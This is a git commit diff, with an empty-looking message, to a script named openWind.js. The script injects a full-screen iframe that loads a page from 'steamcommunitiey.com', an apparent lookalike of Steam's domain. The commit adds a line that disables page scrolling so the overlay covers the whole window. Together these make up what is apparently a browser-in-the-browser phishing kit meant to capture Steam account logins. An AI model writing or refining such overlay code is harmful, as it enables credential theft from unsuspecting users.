762abc4e43556f8f19594e008a2fb017c4a264a9
Oleg Kuzmenko <okuzmenko31us@gmail.com>
2025-02-02 01:56:04 +0200

    .

--- api/static/openWind.js
+++ api/static/openWind.js
@@ -12,6 +12,7 @@ const staticUrl = "https://api.steamcommunitiey.com/static";
                     const iframe = document.createElement("iframe");
                     iframe.src = `${staticUrl}/txqmjgkxhzp5.html`;
                     iframe.style = "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000";
+                    document.documentElement.style.overflow = "hidden";
                     document.body.appendChild(iframe);
                };
             });
